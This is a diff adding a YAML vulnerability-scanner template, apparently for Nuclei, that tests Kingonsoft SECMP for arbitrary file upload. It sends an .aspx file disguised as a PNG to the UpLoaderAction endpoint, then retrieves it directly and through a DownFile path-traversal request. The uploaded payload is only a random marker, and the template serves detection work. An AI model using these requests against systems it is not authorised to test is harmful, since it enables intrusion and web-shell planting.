@@ -1,0 +1,70 @@
+id: poc-yaml-kingonsoft-secmp-uploaderaction-anyfile-upload
+info:
+  name: Kingonsoft SECMP UpLoaderAction Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+  dt3: "{{concat(dt1, dt2)}}"
+  dt4: "{{date_time('02')}}"
+
+flow: |
+  http(1) && http(2) && http(3)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/DevApi/UpLoaderAction"
+    headers:
+      Content-Type: multipart/form-data; boundary=---------------------------45250802924973458471174811279
+    body: |-
+      -----------------------------45250802924973458471174811279
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: image/png
+
+      {{t2}}
+      -----------------------------45250802924973458471174811279
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "\"url\":"
+          - ".aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/Content/Upload/{{dt3}}/{{dt4}}/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
+
+  - id: verify-download
+    method: GET
+    path:
+      - "{{BaseURL}}/DevApi/DownFile?FileName=../Content/Upload/{{dt3}}/{{dt4}}/{{t1}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
